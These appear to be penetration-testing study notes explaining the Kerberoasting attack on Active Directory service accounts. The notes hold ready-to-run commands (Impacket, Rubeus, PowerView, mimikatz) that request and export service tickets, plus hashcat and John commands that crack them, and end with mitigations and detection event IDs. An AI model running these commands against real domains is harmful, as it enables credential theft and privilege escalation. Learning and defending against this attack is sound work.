
# What is Kerberoasting Attack?

* Kerberoasting is a post-exploitation attack targeting Active Directory service accounts. It allows any authenticated user to request a ticket for a service and then crack that ticket offline to reveal the service account's plaintext password.
* Kerberoasting targets **Service Accounts** that have a **Service Principal Name (SPN)** set.
* To understand this attack, we need to understand the second phase of Kerberos: The **TGS (Ticket Granting Service)** exchange.

By default, after a user has a TGT (from the AS-REP stage), they request access to specific resources (like SQL, IIS, etc.) using this flow:

1. **TGS-REQ:** The user presents their TGT to the Domain Controller (KDC) and asks for access to a specific Service (defined by its SPN).
2. **TGS-REP:** The KDC verifies the TGT. If valid, it looks up the requested Service Account.
3. **The Encryption:** The KDC creates a **Service Ticket (ST)**. Crucially, this ticket is **encrypted with the NTLM hash of the Service Account**.
4. The KDC sends this ticket back to the user.
5. The user is supposed to forward this ticket to the Service to authenticate.

## The configuration that allows for this attack ⚙️

The vulnerability relies on the **SPN (`servicePrincipalName`)** attribute.

* In Active Directory, for a service (like MSSQL) to authenticate users via Kerberos, it must register an SPN.
* If this SPN is associated with a **User Account** (instead of a computer account), and that user has a weak password, it is vulnerable.
* **Note:** There is no "vulnerable checkbox" here; the mere existence of an SPN on a user account makes it roastable.

## How the attack works

1. **The Request:** Any valid domain user asks the DC for a TGS ticket for the target service (e.g., `MSSQLSvc/db-server.local`).
2. **The Response:** The DC checks if the user is valid (yes) and issues the ticket. It does **not** check if the user has permission to actually *use* the database, only if they can *ask* for the ticket.
3. **The Extraction:** The DC sends the TGS ticket back to the attacker. This ticket contains a blob of data encrypted with the **Service Account's password hash**.
4. **The Roast:** The attacker saves this ticket to disk and attempts to brute-force decrypt it offline. If they can decrypt it, they have the service account's password.

### Attack Cheatsheet

* **Netexec:** We can use the `--kerberoasting` flag to identify vulnerable accounts and export the hashes.

```shell
nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting output.txt

```

* **Impacket-GetUserSPNs:** This script requests the TGS tickets for all users with SPNs and dumps them in a format ready for cracking.

```shell
# From Linux (Remote)
impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain>/<user>:<password> -outputfile hashes.kerberoast
```

* **Rubeus:** We need to **upload** Rubeus.exe to the target first (or run from memory).

```shell
# From Windows (On Target)
.\Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast /format:hashcat

```

## Cracking Kerberoasting (TGS-REP) tickets

Once you have the hashes, you use Hashcat or John. The hash usually starts with `$krb5tgs$23$...` (Type 23 is RC4, the most common).

* **John the Ripper**

```shell
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt

```

* **Hashcat**
* **Mode 13100** is used for Kerberos 5 TGS-REP etype 23 (Active Directory default).
```shell
hashcat -m 13100 -a 0 -o cracked.txt hashes.kerberoast /usr/share/wordlists/rockyou.txt

```


# Kerberoasting
- For us to request `TGS-REP` We need to have valid domain user credentials or NTLM hash of a user or even a valid TGT
- we need to know where is the DC to query it
## Linux
- Listing SPNs account:
```bash
Impacket-GetUserSPNS -dc-ip 10.10.12.33 domain.com/myuser
```
- to request `TGSs` add the `-request` flag to get all or `-request-user <target>`
- Lastly we can save them into a file
```bash
Impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
## Windows
### Manual
- using windows builtin setspn.exe and focus on `user accounts`
```powershell
setspn.exe -Q */*
```
- Targeting single user
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
- Get all tickets (Tickets will be loaded but we need to extract them from memory)
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
- Extracting tickets using `mimikatz`
```powershell
base64 /out:true   # Important to encode it to print it to stdout instead of saving it to .kirbi
kerberos::list                #List all Kerberos tickets  
kerberos::list /export        #Export tickets to .kirbi files
```
- formatting the B64 ticket (attacker machine), if we got the .kirbi files  we can skip the first 2 commands down below:
```bash
echo "<base64 blob>" | tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
kirbi2john sqldev.kirbi > sqldev.john
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' sqldev.john > sqldev_tgs_hashcat # hashcat formatting
```

### Enumerating SPNs using PowerView
- Getting SPNs
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
- targeting user
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
- Export all tickets to CSV
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
### Rubeus
- Enumeration
```powershell
.\Rubeus.exe kerberoast /stats
```
- targeting users with `admincount = 1`
```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
- We can add `/tgtdeleg` to specify **RC4** encrypted tickets (alg Downgrade), it only works with **Server 2016 or earlier** !!
## Cracking
### Encryption types and modes
there are two main ticket encryptions in Active directory, **RC4** and **AES**, And RC4 is weaker and easier to crack offline

| encryption  | prefix          |
| ----------- | --------------- |
| **RC4**     | `$krb5tgs$23$*` |
| **AES-256** | `$krb5tgs$18$*` |
| `AES-128`   | `$krb5tgs$17$*` |
- Checking encryption using PowerView, if it is 0 -> RC4
```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
### Hashcat
- `RC4` encrypted Tickets
```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
- AES-256 tickets
```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

## Mitigations
- Use Managed Service accounts **MSA**/ Group manages Service accounts **gMSA**
- Use very Strong passwords
- Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.
- Then track event IDs `4769` and `4770`
